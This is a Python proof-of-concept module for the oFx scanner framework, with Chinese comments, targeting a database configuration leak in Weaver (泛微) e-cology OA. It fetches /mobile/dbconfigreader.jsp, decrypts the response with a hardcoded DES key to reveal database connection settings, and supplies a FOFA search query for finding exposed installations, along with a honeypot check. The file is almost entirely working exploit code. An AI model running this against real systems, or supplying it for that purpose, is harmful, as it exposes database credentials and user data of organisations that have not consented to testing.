# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import pyDes
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            POC几个月前就写好了，但是当时有一点小问题，后来忙忘了，
            今晚重新审视POC，参考了下白泽文库的POC，于是稍微改动了一下，
            全网来看暴露在外面的受害主机不多，
            而且仅仅是配置信息泄露，很多还是内网数据库，所以漏洞整体评分应该不会很高 
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "泛微 e-cology OA 数据库配置信息泄露漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "泛微 e-cology",                     # 漏洞应用名称
        "AppVersion" : "目前已知为8.100.0531，不排除其他版本，包括不限于EC7.0、EC8.0",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            泛微 e-cology OA系统某接口存在数据库配置信息泄露漏洞.
            攻击者可通过存在漏洞的页面并解密以后可获取到数据库配置信息。
            泛微e-cology默认数据库大多为MSSQL数据库，如果攻击者可直接访问数据库,则可直接获取用户数据。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="泛微-协同办公OA"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def desdecode(self,secret_key,s):
        cipherX = pyDes.des('        ')
        cipherX.setKey(secret_key)
        y = cipherX.decrypt(s)
        return y

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/mobile/dbconfigreader.jsp" # url自己按需调整


        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False, allow_redirects=False)
            if req.status_code == 200:
                
                config_info = str(self.desdecode('1z2x3c4v5b6n',req.content.strip()))
                if "b'url=" in config_info:
                    vuln = [True,"<title>"+config_info+"</title>"]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()